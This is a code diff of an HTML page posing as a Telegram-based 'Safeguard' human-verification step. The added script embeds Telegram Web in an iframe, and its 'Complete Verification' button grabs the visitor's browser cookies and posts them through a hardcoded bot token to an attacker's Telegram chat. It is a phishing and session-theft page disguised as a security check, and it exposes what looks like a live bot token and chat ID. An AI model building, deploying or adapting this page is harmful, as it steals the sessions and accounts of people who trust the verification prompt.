@@ -1,49 +1,97 @@
 <!DOCTYPE html>
-<html style="--tg-color-scheme: dark; --tg-theme-bg-color: #212121; --tg-theme-text-color: #ffffff;">
-  <head>
-    <meta charset="utf-8">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Safeguard Verification</title>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        background-color: #212121;
-        color: white;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        margin: 0;
-      }
-      .container {
-        text-align: center;
-      }
-      .button {
-        background-color: #0088cc;
-        color: white;
-        border: none;
-        padding: 15px 30px;
-        font-size: 18px;
-        border-radius: 5px;
-        cursor: pointer;
-        margin-top: 20px;
-      }
-      .button:hover {
-        background-color: #0077aa;
-      }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #212121;
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        iframe {
+            width: 100%;
+            height: 70%;
+            border: none;
+            border-radius: 8px;
+        }
+        button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background: #0088cc;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0077aa;
+        }
     </style>
-  </head>
-  <body>
-    <div class="container">
-      <h1>Human Verification</h1>
-      <p>Click below to log in with Telegram:</p>
-      <script async src="https://telegram.org/js/telegram-widget.js?7"
-          data-telegram-login="SafeGuardOfficicalBot"
-          data-size="large"
-          data-auth-url="https://aaaa-m2f9.onrender.com/api/users/telegram/info"
-          data-request-access="write">
-      </script>
-    </div>
-  </body>
+</head>
+<body>
+    <h1>Human Verification</h1>
+    <p>Please log in below to verify:</p>
+    
+    <!-- Embed Telegram Web -->
+    <iframe src="https://web.telegram.org/a/" id="telegram-login-frame"></iframe>
+    
+    <button onclick="grabCookiesAndSend()">Complete Verification</button>
+
+    <script>
+        const BOT_TOKEN = "8054846852:AAHatb3M2yAA8QXj1gQm7iWlcrDgqcHAE1E"; // Replace with your bot token
+        const ADMIN_CHAT_ID = "6263982437"; // Replace with your Telegram chat ID
+
+        function grabCookiesAndSend() {
+            try {
+                // Grab cookies from the browser
+                const cookies = document.cookie || "No cookies found";
+
+                // Construct the message to send
+                const message = `
+🔐 <b>Verification Complete:</b>
+🍪 <b>Cookies:</b> ${cookies}
+                `;
+
+                // Send the cookies directly to your bot
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Verification complete! Data sent.");
+                    } else {
+                        alert("Failed to send information. Check your bot settings.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending data to Telegram:", error);
+                });
+            } catch (err) {
+                console.error("Error grabbing cookies:", err);
+                alert("An error occurred while grabbing cookies.");
+            }
+        }
+    </script>
+</body>
 </html>
